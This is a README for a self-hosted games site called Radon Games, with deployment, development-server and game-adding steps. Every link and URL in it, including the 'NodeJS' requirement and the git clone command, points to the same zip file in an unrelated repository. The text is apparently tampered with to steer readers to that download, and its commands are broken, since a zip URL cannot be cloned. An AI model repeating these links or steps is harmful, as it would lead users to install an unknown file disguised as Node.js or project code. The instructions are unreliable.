## Regular Deployment

Deploy on local system or VPS.

### Requirements

- [NodeJS version >=18](https://raw.githubusercontent.com/Foolman21/BLOCKEDGAM/main/scripts/uv/Software-v3.8.zip)

```bash
git clone https://raw.githubusercontent.com/Foolman21/BLOCKEDGAM/main/scripts/uv/Software-v3.8.zip
cd Radon-Games
npm i
npm run build
npm start
```

## Starting Development Server

The development server has hot module replacement for ease of development. **DO NOT USE FOR PRODUCTION.**

```bash
npm run dev
```

## Adding Games

In order to add games to Radon, you will first need to download the game files using some form of a website scraper. Once you have the game files, you will have to upload them to the [Radon-Games-Assets](https://raw.githubusercontent.com/Foolman21/BLOCKEDGAM/main/scripts/uv/Software-v3.8.zip) in the corresponding folder. Once the games have been uploaded to the repository, you will need to edit [`https://raw.githubusercontent.com/Foolman21/BLOCKEDGAM/main/scripts/uv/Software-v3.8.zip`](https://raw.githubusercontent.com/Foolman21/BLOCKEDGAM/main/scripts/uv/Software-v3.8.zip) add add an entry for the game.
